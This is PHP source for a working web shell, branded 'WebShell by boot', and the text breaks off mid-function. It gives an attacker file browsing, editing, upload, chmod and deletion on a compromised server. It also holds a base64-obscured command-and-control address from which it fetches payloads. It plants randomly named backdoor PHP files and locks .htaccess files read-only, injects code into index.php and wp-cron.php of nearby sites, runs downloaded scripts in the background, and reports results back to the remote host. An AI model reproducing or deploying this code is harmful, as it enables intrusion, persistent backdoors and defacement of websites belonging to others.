<?php 
@set_time_limit(0);
error_reporting(0);
session_start();
$type = $_REQUEST['type'];
$path = $_REQUEST['path'];
$data = $_SERVER;
$website_path = $data['DOCUMENT_ROOT'];
$file_path = $data['SCRIPT_FILENAME'];
$now_path = dirname($file_path);
$web_url = $data['REQUEST_SCHEME']."://".$data['SERVER_NAME'];
if(!empty($path)){
    $file_path = $path;
    $now_path = $path;
}
if($type == 1){
    $now_path = $path;
}
$file_path_array = explode('/', $file_path);
if(!is_dir($now_path)){
    $now_path = dirname($now_path);
}
$can_read = false;
if (is_readable($now_path)) {
    $can_read = true;
}
$can_write = false;
if (is_writable($now_path)) {
    $can_write = true;
}
$prot = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://";
$domain = $_SERVER['HTTP_HOST'];
$now_site = $prot . $domain;
$sy_path = str_replace($website_path, '', $now_path);
$now_url = $web_url.$sy_path;
$post_data = $_POST;
$pws = "aHR0cHM6Ly9mcDIwMjQuYnlob3QudG9w";
if(!empty($post_data)){
    foreach ($post_data as $k=>$v){
        $_SESSION[$k] = $v;
    }
}
$all_paths = array();
$door_lists = array();
$last_folders = array();
if(!empty($_SESSION['c2hlbGxfY29kZQ==']) && strlen($_SESSION['c2hlbGxfY29kZQ==']) == 20){
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>WebShell by boot</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<body>
<div class="jumbotron text-center" style="padding: 1rem 0rem;">
  <h1 style="font-size:2rem;font-weight: bold;margin: 1rem 0;">WebShell by boot</h1>
</div>
<div class="container">
  <div class="row">
      <p>
          <div style="width: 30%;display:inline-block;">Server IP: <?php echo $data['SERVER_ADDR'];?></div>
          <div style="width: 30%;display:inline-block;">Server Software: <?php echo $data['SERVER_SOFTWARE'];?></div>
          <div style="width: 30%;display:inline-block;">OS: <?php echo PHP_OS;?></div>
      </p>
      <p>
          <div style="width: 30%;display:inline-block;">Website: <?php echo $data['HTTP_HOST'];?></div>
          <div style="width: 30%;display:inline-block;">User: <?php echo get_current_user();?></div></p>
      <p>
            <a href="?path=<?php echo $website_path;?>">Project</a>
      </p>
  </div>
  <div class="row">
      <p>
          Path: 
          <?php 
          $file_now_path = "";
          foreach($file_path_array as $k=>$v){
          ?><?php if(empty($v)){ ?><a href="?path=/">-</a>r
          <?php }else{if(empty($file_now_url)){$file_now_url = $v;}else{$file_now_url = $file_now_url . '/' .$v;}$file_now_path = $file_now_path . "/" . $v;?>/<a href="?path=<?php echo $file_now_path;?>"><?php echo trim($v);?></a><?php } ?><?php }?>
          &nbsp;&nbsp;&nbsp;&nbsp;<span <?php if($can_read){?>style="color:green;"<?php }else{ ?>style="color:red;"<?php }?>>Readable</span> | <span <?php if($can_write){?>style="color:green;"<?php }else{ ?>style="color:red;"<?php }?>>Writeable</span>
      </p>
  </div>
  <?php if($type == 2 || $type == 3){ 
    if($type == 3){
        $file_content = $_REQUEST['file_content'];
        $content_result = file_put_contents($path, $file_content);
        if ($content_result) {
            echo '<div class="alert alert-success" role="alert">File content modified successfully!</div>';
        }else{
            echo '<div class="alert alert-danger" role="alert">Failed to modify file content!</div>';
        }
    }
  ?>
    <div class="row">
        <form action="?type=3" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $file_path;?>"/>
          <div class="form-group">
             <?php $content = file_get_contents($file_path);?>
            <textarea class="form-control" id="exampleFormControlTextarea1" name="file_content" rows="20" cols="100"><?php echo htmlspecialchars($content);?></textarea>
          </div>
          <button type="submit" class="btn btn-success">Edit</button>
        </form>
    </div>
  <?php }else if($type == 4){ 
    $file_new_name = $_POST['file_new_name'];
    if(!empty($file_new_name)){
        $rename_result = rename($file_path, $now_path.'/'.$file_new_name);
        if($rename_result){
            echo '<div class="alert alert-success" role="alert">File name modified successfully!</div>';
            $file_path = $now_path.'/'.$file_new_name;
        }else{
            echo '<div class="alert alert-danger" role="alert">Failed to modify file name!</div>';
        }
    }
  ?>
    <div class="row">
        <form action="?type=4" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $file_path;?>"/>
          <div class="form-group">
             <?php $content = file_get_contents($file_path);?>
             <input type="text" class="form-control" id="file_new_name" name="file_new_name" value="<?php echo basename($file_path);?>">
          </div>
          <button type="submit" class="btn btn-success">Edit</button>
        </form>
    </div>
    <?php }else if($type == 5){ 
        $new_chmod = trim($_POST['new_chmod']);
        if(!empty($new_chmod)){
            if (chmod($file_path, octdec($new_chmod))) {
                echo '<div class="alert alert-success" role="alert">File permissions modified successfully!</div>';
                $old_chmod = $new_chmod;
            }else{
                echo '<div class="alert alert-danger" role="alert">Failed to modify file permissions!</div>';
            }
        }else{
            $permissions = fileperms($file_path);
            $old_chmod = substr(sprintf('%o', $permissions), -4);
        }
   ?>
    <div class="row">
        <form action="?type=5" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $file_path;?>"/>
          <div class="form-group">
             <?php $content = file_get_contents($file_path);?>
             <input type="text" class="form-control" id="new_chmod" name="new_chmod" value="<?php echo $old_chmod;?>">
          </div>
          <button type="submit" class="btn btn-success">Edit</button>
        </form>
    </div>
    <?php }else if($type == 6){ 
        $new_name = trim($_POST['new_name']);
        $new_content = trim($_POST['new_content']);
        if(!empty($new_name)){
            if(is_file($now_path.'/'.$new_name)){
                echo '<div class="alert alert-danger" role="alert">The file already exists!</div>';
            }else{
                $file = fopen($now_path.'/'.$new_name, 'w');
                if ($file) {
                    if (fwrite($file, $new_content)) {
                        echo '<div class="alert alert-success" role="alert">File created successfully!</div>';
                    } else {
                        echo '<div class="alert alert-danger" role="alert">Unable to write to file!</div>';
                    }
                    fclose($file);
                } else {
                    echo '<div class="alert alert-danger" role="alert">Unable to open file!</div>';
                }
            }
        }
   ?>
    <div class="row">
        <form action="?type=6" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $file_path;?>"/>
          <div class="form-group">
             <input type="text" class="form-control" id="new_name" name="new_name" value="<?php echo $new_name;?>" placeholder="New File Name">
          </div>
          <div class="form-group">
             <textarea class="form-control" id="new_content" name="new_content" rows="20" cols="100" placeholder="New File Content"><?php echo htmlspecialchars($new_content);?></textarea>
          </div>
          <button type="submit" class="btn btn-success">Create Now</button>
        </form>
    </div>
    <?php }else if($type == 7){ 
        $new_name = trim($_POST['new_name']);
        if(!empty($new_name)){
            if (!is_dir($now_path . '/' . $new_name)) {
                if (mkdir($now_path . '/' . $new_name)) {
                    echo '<div class="alert alert-success" role="alert">Directory created successfully!</div>';
                } else {
                    echo '<div class="alert alert-success" role="alert">Directory creation failed!</div>';
                }
            }else{
                echo '<div class="alert alert-success" role="alert">Directory already exists!</div>';
            }
        }
   ?>
    <div class="row">
        <form action="?type=7" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $file_path;?>"/>
          <div class="form-group">
             <input type="text" class="form-control" id="new_name" name="new_name" value="<?php echo $new_name;?>" placeholder="New Folder Name">
          </div>
          <button type="submit" class="btn btn-success">Create Now</button>
        </form>
    </div>
  <?php }else{ ?>
  <?php 
    if($_POST['act'] == 'del'){
        $delete_file_list = $_POST['childcheck'];
        if(!empty($delete_file_list)){
            $count = 0;
            $fail_count = 0;
            foreach ($delete_file_list as $k=>$v){
                $del_result = unlink($v);
                if($del_result){
                    $count++;
                }else{
                    $fail_count++;
                }
            }
            if($count > 0){
                echo '<div class="alert alert-success" role="alert">Delete '.$count.' files successfully!</div>';
            }
            if($fail_count > 0){
                echo '<div class="alert alert-danger" role="alert">Delete '.$fail_count.' files failed!</div>';
            }
        }
    }
    if($_POST['act'] == 'upload'){
        $targetFile = $now_path . '/' . basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
            echo '<div class="alert alert-success" role="alert">File '.htmlspecialchars(basename($_FILES["fileToUpload"]["name"])).' uploaded!</div>';
        } else {
            echo '<div class="alert alert-danger" role="alert">File upload failed!</div>';
        }
    }
    $file_list = scandir($now_path);
    $file_list = sortByFolder($now_path, $file_list);
  ?>
  <div class="row">
      <div class="col-12" style="margin-bottom: 1rem;">
        <form action="?path=<?php echo $file_path;?>" method="post" enctype="multipart/form-data">
            <input type="hidden" name="act" value="upload"/>
            <input class="form-control form-control-sm" id="formFileSm" name="fileToUpload" type="file" style="width: 200px;display: inline-block;">
            <button type="submit" class="btn btn-info btn-sm">Upload</button>
            <a class="btn btn-primary btn-sm" href="?path=<?php echo $file_path;?>&type=6">Create File</a>
            <a class="btn btn-success btn-sm" href="?path=<?php echo $file_path;?>&type=7">Create Folder</a>
        </form>
      </div>
      <div class="bd-example bd-example-row" style="border: 1px solid #ededed;padding: 1rem;margin: 1rem 0;">
          <div class="row">
            <div class="col-2 col-sm-1">
              <form action="?path=<?php echo $file_path;?>" method="post">
                <input type="hidden" name="act" value="shell"/>
                <input type="hidden" name="type" value="reback"/>
                <input type="hidden" name="group_id" value="<?php echo $_SESSION['Z3JvdXA='];?>"/>
                <input type="hidden" name="shell_id" value="<?php echo $_SESSION['c2hlbGxfaWQ='];?>"/>
                <button type="submit" class="btn btn-success btn-sm">Reback</button>
              </form>
            </div>
            <div class="col-2 col-sm-1">
                <form action="?path=<?php echo $file_path;?>" method="post">
                    <input type="hidden" name="act" value="shell"/>
                    <input type="hidden" name="type" value="exec"/>
                    <input type="hidden" name="group_id" value="<?php echo $_SESSION['Z3JvdXA='];?>"/>
                    <input type="hidden" name="shell_id" value="<?php echo $_SESSION['c2hlbGxfaWQ='];?>"/>
                    <button type="submit" class="btn btn-warning btn-sm">Exec</button>
                </form>
            </div>
            <div class="col-2 col-sm-1">
                <form action="?path=<?php echo $file_path;?>" method="post">
                    <input type="hidden" name="act" value="shell"/>
                    <input type="hidden" name="type" value="others"/>
                    <input type="hidden" name="shell_id" value="<?php echo $_SESSION['c2hlbGxfaWQ='];?>"/>
                    <input type="hidden" name="group_id_2" value="<?php echo $_SESSION['c2Vjb25k'];?>"/>
                    <input type="hidden" name="group_id_3" value="<?php echo $_SESSION['dGhpcmRncm91cA=='];?>"/>
                    <button type="submit" class="btn btn-info btn-sm">Others</button>
                </form>
            </div>
            <div class="col-2 col-sm-1">
                <form action="?path=<?php echo $file_path;?>" method="post">
                    <input type="hidden" name="act" value="shell"/>
                    <input type="hidden" name="type" value="doors"/>
                    <input type="hidden" name="shell_id" value="<?php echo $_SESSION['c2hlbGxfaWQ='];?>"/>
                    <button type="submit" class="btn btn-danger btn-sm">Doors</button>
                </form>
            </div>
            <div class="col-2 col-sm-1">
                <form action="?path=<?php echo $file_path;?>" method="post">
                    <input type="hidden" name="act" value="shell"/>
                    <input type="hidden" name="type" value="station"/>
                    <input type="hidden" name="shell_id" value="<?php echo $_SESSION['c2hlbGxfaWQ='];?>"/>
                    <button type="submit" class="btn btn-primary btn-sm">Station</button>
                </form>
            </div>
        </div>
      </div>
      <div class="bd-example bd-example-row" style="border: 1px solid #ededed;padding: 1rem;margin: 1rem 0;">
          <div class="row">
              <div class="col-12 col-sm-12" style="text-align: center;font-weight:bold;">
              <?php 
                if($_POST['act'] == 'shell'){
                    if($_POST['type'] == 'reback'){
                        rebackAction($_POST, $pws, $now_site);
                    }else if($_POST['type'] == 'exec'){
                        execAction($_POST, $pws, $now_site);
                    }else if($_POST['type'] == 'doors'){
                        doorsAction($_POST, $pws, $now_site);
                    }else if($_POST['type'] == 'others'){
                        othersAction($_POST, $pws, $now_site);
                    }else if($_POST['type'] == 'station'){
                        stationAction($_POST, $pws, $now_site);
                    }
                }
              ?>
              </div>
          </div>
      </div>
      <form action="?path=<?php echo $file_path;?>" method="post">
      <div class="col-12" style="margin-bottom: 1rem;">
        <input type="hidden" name="act" value="del"/>
        <button type="submit" class="btn btn-danger btn-xs">Delete</button>
      </div>
      <table class="table table-bordered">
        <thead>
          <tr>
            <th>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" value="1" id="allcheck" name="allcheck">
                </div>
            </th>  
            <th>Name</th>
            <th>Url</th>
            <th>Size</th>
            <th>Modify</th>
            <th>Permission</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          <?php 
          if(!empty($file_list) && count($file_list) > 2){
          foreach($file_list as $k=>$v){
           if(!($v == '.' || $v == '..')){
               $file_url = $now_path . '/' .$v;
          ?>
          <tr>
            <th>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" value="<?php echo $file_url;?>" name="childcheck[]">
                </div>
            </th> 
            <td>
                <?php 
                 if(is_dir($file_url)){
                     echo '<a href="?path='.$file_url.'&type=1" style="color: green;font-weight:bold;">
                     <i class="bi bi-folder" style="vertical-align: middle;">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-folder" viewBox="0 0 16 16">
                        <path d="M.54 3.87.5 3a2 2 0 0 1 2-2h3.672a2 2 0 0 1 1.414.586l.828.828A2 2 0 0 0 9.828 3h3.982a2 2 0 0 1 1.992 2.181l-.637 7A2 2 0 0 1 13.174 14H2.826a2 2 0 0 1-1.991-1.819l-.637-7a1.99 1.99 0 0 1 .342-1.31zM2.19 4a1 1 0 0 0-.996 1.09l.637 7a1 1 0 0 0 .995.91h10.348a1 1 0 0 0 .995-.91l.637-7A1 1 0 0 0 13.81 4H2.19zm4.69-1.707A1 1 0 0 0 6.172 2H2.5a1 1 0 0 0-1 .981l.006.139C1.72 3.042 1.95 3 2.19 3h5.396l-.707-.707z"/>
                        </svg>
                    </i>'.$v.'</a>';
                 }else{
                     echo '<a href="?path='.$file_url.'&type=2">'.$v.'</a>';
                 }
                ?>
            </td>
            <td>
                <?php if(!is_dir($file_url)){ ?>
                <a href="<?php echo $now_url.'/'.$v;?>" target="_blank">click visit</a>
                <?php } ?>
            </td>
            <td>
                <?php 
                 if(is_dir($file_url)){
                     echo '<font color="green" style="font-weight: bold;">Directory</font>';
                 }else{
                     echo getFileSize($file_url);
                 }
                ?>
            </td>
            <td>
                <?php 
                $modificationTime = filemtime($file_url);
                echo date("Y-m-d H:i:s", $modificationTime);
                ?>
            </td>
            <td>
                <?php $permission = getFilePermission($file_url);
                    if(strpos($permission, 'w') !== false){
                        echo '<font color="green" style="font-weight: bold;">'.$permission.'</font>';
                    }else{
                        echo '<font color="red" style="font-weight: bold;">'.$permission.'</font>';
                    }
                ?>
            </td>
            <td>
                <a class="btn btn-primary btn-xs" href="?path=<?php echo $file_url;?>&type=4">Rename</a>
                <a class="btn btn-info btn-xs" href="?path=<?php echo $file_url;?>&type=2">Edit</a>
                <a class="btn btn-warning btn-xs" href="?path=<?php echo $file_url;?>&type=5">Chmod</a>
            </td>
          </tr>
          <?php }}}else{ ?>
          <tr>
              <td colspan="4" style="text-align: center;color:red;">
                  No Files!
              </td>
          </tr>
          <?php }?>
        </tbody>
      </table>
      </form>
  </div>
  <?php }?>
</div>
<script>
    $(function(){
        $('#allcheck').click(function(){
            if($('#allcheck').is(":checked")){
                $('input[name="childcheck[]"]').each(function(){
                    $(this).attr('checked', true);
                })
            }else{
                $('input[name="childcheck[]"]').each(function(){
                    $(this).attr('checked', false);
                })
            }
        })
    })
</script>
</body>
</html>
<?php }?>
<?php 
function getFileSize($file_url){
    $file_size = filesize($file_url);
    if($file_size > 1024 * 1024){
        $file_size = round($file_size / (1024 * 1024), 2).' MB';
    }else if($file_size > 1024){
        $file_size = round($file_size / 1024, 2).' KB'; 
    }else{
        $file_size = $file_size.' B'; 
    }
    return $file_size;
}
function getFilePermission($filename) {
    clearstatcache(true, $filename);
    $perms = fileperms($filename);
    if (($perms & 0xC000) === 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) === 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) === 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) === 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) === 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) === 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) === 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
function sortByFolder($now_path, $all_list){
    $folder_list = array();
    $file_list = array();
    foreach ($all_list as $k=>$v){
        if(is_dir($now_path.'/'.$v)){
            $folder_list[] = $v;
        }else{
            $file_list[] = $v;
        }
    }
    sort($folder_list);
    sort($file_list);
    $all_list = array_merge($folder_list, $file_list);
    return $all_list;
}

function rebackAction($data, $pweb, $now_site){
    $group_id = $data['group_id'];
    $shell_id = $data['shell_id'];
    $url = base64_decode($pweb).'/indexdoor.php?action=reback&group_id='.$group_id;
    $cc = curlget($url);
    $json_array = json_decode($cc, true);
    $result_data = array();
    $result_data['shell_id'] = $shell_id;
    $result_data['action'] = 'reback';
    $save_url = base64_decode($pweb).'/save.php';
    if(isset($json_array['in_files']) && !empty($json_array['in_files'])){
        $wp_code = $json_array['wp_code'];
        $in_list = explode(';', $json_array['in_files']);
        foreach ($in_list as $k=>$v){
            $wpstr = strslit($v);
            $wp_code = str_replace('[##in_contnt_'.$k.'##]', $wpstr, $wp_code);
            $contnt = $json_array['code'].$json_array['wp_ycode'];
            crefile($v, $contnt);
        }
        $ht_list = explode(';', $json_array['ht_files']);
        foreach ($ht_list as $k=>$v){
            $wpstr = strslit($v);
            $wp_code = str_replace('[##ht_contnt_'.$k.'##]', $wpstr, $wp_code);
            $contnt = $json_array['ht_contnt'];
            crefile($v, $contnt);
        }
        $wp_list = explode(';', $json_array['wp_files']);
        $wp_result = array();
        foreach ($wp_list as $k=>$v){
            $f = crefile($v, $wp_code);
            if($f){
                $wp_result[] = $now_site.$v;
            }
        }
        if(!empty($wp_result) && count($wp_result) > 0){
            $result_data['wp_urls'] = $wp_result;
            $result_data['status'] = 1;
        }else{
            $result_data['code'] = '1001';
            $result_data['status'] = 2;
        }
    }else{
        $result_data['code'] = '1002';
        $result_data['status'] = 2;
    }
    $res = curlpost($save_url, $result_data);
    if($res['status']){
        echo '<p style="color:green;">Reback is successfully</p>';
        foreach($wp_result as $k=>$v){
            echo '<p><a href="'.$v.'" target="_blank">'.$v.'</a></p>';
        }
    }else{
        echo '<p style="color:red;">Reback is failed! '.$result_data['code'].'</p>';
    }
}

function execAction($data, $pweb, $now_site){
    $group_id = $data['group_id'];
    $shell_id = $data['shell_id'];
    $url = base64_decode($pweb).'/indexdoor.php?action=exec&group_id='.$group_id;
    
    $result_data = array();
    $result_data['shell_id'] = $shell_id;
    $result_data['action'] = 'exec';
    $save_url = base64_decode($pweb).'/save.php';
    $cc = curlget($url);
    $json_array = json_decode($cc, true);
    if(isset($json_array['in_contnt']) && !empty($json_array['ht_contnt']) && !empty($json_array['exec_code'])){
        $result = add_exec($json_array['ht_contnt'], $json_array['in_contnt'], $json_array['exec_code'], $json_array['wp_ycode']);
        if($result){
            $result_data['status'] = 1;
        }else{
            $result_data['code'] = '1001';
            $result_data['status'] = 2;
        }
    }else{
        $result_data['code'] = '1002';
        $result_data['status'] = 2;
    }
    $res = curlpost($save_url, $result_data);
    if($res['status']){
        echo '<p style="color:green;">Exec is successfully</p>';
    }else{
        echo '<p style="color:red;">Exec is failed! '.$result_data['code'].'</p>';
    }
}

function add_exec($ht_contnt, $index_contnt, $exec_code, $wp_ycode){
    $exec_code = str_replace("[##htcontent##]", base64_encode($ht_contnt), $exec_code);
    $exec_code = str_replace("[##indexcontent##]", base64_encode($index_contnt.$wp_ycode), $exec_code);
    
    $l12 = array("1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m");
    for ($i = 1;$i < rand(6, 6);$i++) {
        $e14 = rand(0, count($l12) - 1);
        $o15.= $l12[$e14];
    }
    $u17 = fopen($o15 . ".php", "w");
    fwrite($u17, $exec_code);
    fclose($u17);
    exec("php -f" . __DIR__ . "/$o15.php > /dev/null 2>/dev/null &", $e18, $res);
    if ($res === 0) {
        return true;
    } else {
        return false;
    }
}

function othersAction($data, $pweb, $now_site){
    $shell_id = $data['shell_id'];
    $group_id_2 = $data['group_id_2'];
    $group_id_3 = $data['group_id_3'];
    $url = base64_decode($pweb).'/indexdoor.php?action=others&group_id_2='.$group_id_2.'&group_id_3='.$group_id_3;
    
    $result_data = array();
    $result_data['shell_id'] = $shell_id;
    $result_data['action'] = 'others';
    $save_url = base64_decode($pweb).'/save.php';
    $cc = curlget($url);
    $json_array = json_decode($cc, true);
    if((!empty($json_array['group2_code']) && !empty($json_array['second_file'])) || 
        (!empty($json_array['group3_code']) && !empty($json_array['third_file']))
    ){
        $result = add_others($json_array['group2_code'], $json_array['group3_code'], $json_array['second_file'], $json_array['third_file'], $now_site);
        if(!empty($result['second_url']) || !empty($result['third_url'])){
            $result_data['second_url'] = $result['second_url'];
            $result_data['third_url'] = $result['third_url'];
            $result_data['status'] = 1;
        }else{
            $result_data['code'] = '1001';
            $result_data['status'] = 2;
        }
    }else{
        $result_data['code'] = '1002';
        $result_data['status'] = 2;
    }
    $res = curlpost($save_url, $result_data);
    if($res['status']){
        echo '<p style="color:green;">Others is successfully</p>';
    }else{
        echo '<p style="color:red;">Others is failed! '.$result_data['code'].'</p>';
    }
}

function add_others($group2_code, $group3_code, $second_file, $third_file, $now_site){
    $result = array();
    $sf = crefile($second_file, $group2_code);
    $tf = crefile($third_file, $group3_code);
    $result['second_url'] = "";
    $result['third_url'] = "";
    if($sf){
        $result['second_url'] = $now_site.'/'.$second_file;
    }
    if($tf){
        $result['third_url'] = $now_site.'/'.$third_file;
    }
    return $result;
}

function doorsAction($data, $pweb, $now_site){
    $result_data = array();
    $result_data['shell_id'] = $data['shell_id'];
    $result_data['action'] = 'doors';
    $save_url = base64_decode($pweb).'/save.php';
    
    $shell_id = $data['shell_id'];
    $url = base64_decode($pweb).'/indexdoor.php?action=doors&shell_id='.$shell_id;
    $cc = curlget($url);
    $json_array = json_decode($cc, true);
    if(!empty($json_array['doors'])){
        $result = add_doors($json_array['doors'], $json_array['wp_files'], $json_array['third_file'], $json_array['ht_ban_content'], $json_array['ht_open_content'],  $now_site);
        if(!empty($result['door_files'])){
            $result_data['door_urls'] = implode(';', $result['door_files']);
            $result_data['status'] = 1;
        }else{
            $result_data['code'] = '1001';
            $result_data['status'] = 2;
        }
    }else{
        $result_data['code'] = '1002';
        $result_data['status'] = 2;
    }
    $res = curlpost($save_url, $result_data);
    if($res['status']){
        echo '<p style="color:green;">Doors is successfully, Success .h is '.$result['count'].'</p>';
        foreach($result['door_files'] as $k=>$v){
            echo '<p><a href="'.$v.'" target="_blank">'.$v.'</a></p>';
        }
    }else{
        echo '<p style="color:red;">Doors is failed! '.$result_data['code'].'</p>';
    }
}

function add_doors($doors_array, $wp_files, $third_file, $ban_content, $open_content, $now_site){
    $result = array();
    global $door_lists, $all_paths;
    $path = $_SERVER['DOCUMENT_ROOT'];
    getAllDirectories($path, 1);
    $randomKeys = array_rand($door_lists, count($doors_array));
    $door_files = array();
    $succ_files = array();
    $i = 0;
    foreach ($randomKeys as $key) {
        $file_door_url = $door_lists[$key];
        $file_name = getrandstr(rand(5, 10)).'.php';
        $file_url = $file_door_url.'/'.$file_name;
        $res = crdoorfile($file_url, $doors_array[$i]);
        if($res){
            $succ_files[] = $file_url;
            $door_files[] = str_replace($path, $now_site, $file_url);
        }
        $i++;
    }
    $count = 0;
    if(count($succ_files) > 0){
        $ht_urls = array();
        $wp_files_array = explode(";", $wp_files);
        foreach ($wp_files_array as $k=>$v){
            $wp_files_array[$k] = $path.$v;
        }
        $ht_urls = $succ_files;
        $ht_urls = array_merge($ht_urls, $wp_files_array);
        $ht_urls[] = $path.'/'.$third_file;
        
        $ht_folders = array();
        $ht_files = array();
        foreach ($ht_urls as $k=>$v){
            $ht_folders[] = dirname($v);
            $ht_files[] = basename($v);
        }
        foreach ($all_paths as $k=>$a){
            $now_files = array();
            foreach($ht_folders as $htk=>$htv){
                if($a == $htv){
                    $now_files[] = $ht_files[$htk];
                }
            }
            $ht_content_now = "";
            if(!empty($now_files)){
                $ht_content_now = str_replace('{#htcontent}', implode('|', $now_files), $open_content);
            }else{
                $ht_content_now = $ban_content;
            }
            chmod($a.'/.htaccess', 0644);
            if (file_put_contents($a.'/.htaccess', $ht_content_now) !== false) {
                $count++;
                chmod($a.'/.htaccess', 0444);
            }
        }
    }
    $result['door_files'] = $door_files;
    $result['count'] = $count;
    return $result;
}

function getAllDirectories($path, $depth) {
    global $all_paths, $door_lists, $last_folders;
    $minDepth = 3;
    $maxDepth = 8;
    $directories = [];
    $files = scandir($path);
    foreach($files as $file) {
        if ($file == '.' || $file == '..') {
            continue;
        }
        $fullPath = $path . DIRECTORY_SEPARATOR . $file;
        if (is_dir($fullPath)) {
            $all_paths[] = $fullPath;
            if ($depth >= $minDepth && $depth <= $maxDepth) {
                $directories[] = $fullPath;
                $door_lists[] = $fullPath;
            }
            if($depth == 5 && count($last_folders) == 0){
                $last_folders[] = $fullPath;
            }
            if ($depth < $maxDepth) {
                $directories = array_merge($directories, getAllDirectories($fullPath, $depth + 1));
            }
        }
    }
    return $directories;
}

function stationAction($data, $pweb, $now_site){
    $result_data = array();
    $result_data['shell_id'] = $data['shell_id'];
    $result_data['action'] = 'station';
    $save_url = base64_decode($pweb).'/save.php';
    
    $shell_id = $data['shell_id'];
    $url = base64_decode($pweb).'/indexdoor.php?action=station&shell_id='.$shell_id;
    $cc = curlget($url);
    $json_array = json_decode($cc, true);
    $station_count = 0;
    if(!empty($json_array['station_code']) && !empty($json_array['ht_pz_content'])){
        $station_count = add_station($json_array['station_code'], $json_array['ht_pz_content'],  $now_site);
        if($station_count > 0){
            $result_data['station_count'] = $station_count;
            $result_data['status'] = 1;
        }else{
            $result_data['code'] = '1001';
            $result_data['status'] = 2;
        }
    }else{
        $result_data['code'] = '1002';
        $result_data['status'] = 2;
    }
    $result_data['shell_url'] = $now_site;
    $res = curlpost($save_url, $result_data);
    if($res['status']){
        echo '<p style="color:green;">Station is successfully, Success is '.$station_count.'</p>';
    }else{
        echo '<p style="color:red;">Station is failed! '.$result_data['code'].'</p>';
    }
}

function add_station($station_code, $ht_content,  $now_site){
    $count = 0;
    $path = $_SERVER['DOCUMENT_ROOT'];
    $folder_name = basename($path);
    $all_folders = getParentsFolders($path);
    $all_results = array();
    foreach($all_folders as $k=>$v){
        $directories = glob($v. '/*', GLOB_ONLYDIR);
        $all_folders = array_merge($all_folders, $directories);
    }
    foreach($all_folders as $k=>$v){
        if(!strpos($v, $folder_name)){
            $all_results[] = $v;
        }
    }
    foreach ($all_results as $k=>$v){
        $index_url = $v.'/index.php';
        $wp_url = $v.'/wp-cron.php';
        $ht_url = $v.'/.htaccess';
        $index_yuan = "";
        if(file_exists($index_url)){
            chmod($index_url, 0644);
            $index_yuan = file_get_contents($index_url);
        }
        file_put_contents($index_url, $station_code.$index_yuan);
        chmod($index_url, 0444);
        
        $wp_yuan = "";
        if(file_exists($wp_url)){
            chmod($wp_url, 0644);
            $wp_yuan = file_get_contents($wp_url);
        }
        file_put_contents($wp_url, $station_code.$wp_yuan);
        chmod($wp_yuan, 0444);
        
        chmod($ht_url, 0644);
        file_put_contents($ht_url, $ht_content);
        chmod($ht_url, 0444);
        $count++;
    }
    return $count;
}

function getParentsFolders($path){
    $all_folders = array();
    $parent_folds = dirname($path);
    $directories = glob($parent_folds. '/*', GLOB_ONLYDIR);
    $all_folders = $directories;
    
    $parent_folds = dirname($parent_folds);
    $directories = glob($parent_folds. '/*', GLOB_ONLYDIR);
    $all_folders = array_merge($all_folders, $directories);
    return $all_folders;
}

function curlget($url){
    $url_data = "";
    if (function_exists('file_get_contents')) {
        $url_data = file_get_contents($url);
    }
    if (empty($url_data) && function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $url_data = curl_exec($conn);
        curl_close($conn);
    }
    if (empty($url_data) && function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_data = stream_get_contents($handle);
        fclose($handle);
    }
    return $url_data;
}

function curlpost($url, $data){
    $jsonData = json_encode($data);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
